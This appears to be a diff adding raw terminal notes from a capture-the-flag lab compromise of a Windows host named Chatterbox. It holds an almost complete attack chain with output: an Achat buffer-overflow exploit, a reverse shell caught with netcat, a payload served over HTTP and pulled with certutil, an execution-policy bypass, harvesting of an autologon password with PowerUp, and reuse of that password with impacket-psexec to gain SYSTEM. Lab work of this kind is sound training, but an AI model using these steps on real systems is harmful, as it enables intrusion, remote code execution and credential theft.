@@ -1,0 +1,103 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit Achat                        
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Achat 0.150 beta7 - Remote Buffer Overflow                                         | windows/remote/36025.py
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python2 exploit.py
+---->{P00F}!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.74 - - [10/Nov/2025 00:55:27] "GET /rev_shell.ps1 HTTP/1.1" 200 -
+ 
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53       
+listening on [any] 53 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.10.74] 49161
+whoami
+chatterbox\alfred
+PS C:\Windows\system32> 
+
+
+
+PS C:\Users\Alfred\Desktop> certutil.exe -f -urlcache http://10.10.14.49:8000/PowerUp.ps1 PowerUp.ps1
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\Alfred\Desktop> 
+
+
+PS C:\Users\Alfred\Desktop> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+PS C:\Users\Alfred\Desktop> . .\PowerUp.ps1
+Invoke-AllChecksPS C:\Users\Alfred\Desktop> 
+
+
+DefaultDomainName    : 
+DefaultUserName      : Alfred
+DefaultPassword      : Welcome1!
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+Check                : Registry Autologons
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files
+
+
+
+PS C:\Users\Alfred\Desktop> 
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-psexec Administrator:'Welcome1!'@10.10.10.74
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.74.....
+[*] Found writable share ADMIN$
+[*] Uploading file WFVWLZiR.exe
+[*] Opening SVCManager on 10.10.10.74.....
+[*] Creating service pVql on 10.10.10.74.....
+[*] Starting service pVql.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+
+
+
+takeown /f root.txt /a
+icacls root.txt /reset
+icacls root.txt /grant SYSTEM:F
+type root.txt
+
+
+
+icacls root.txt /grant Everyone:R
+
+
+
+
+
+
+
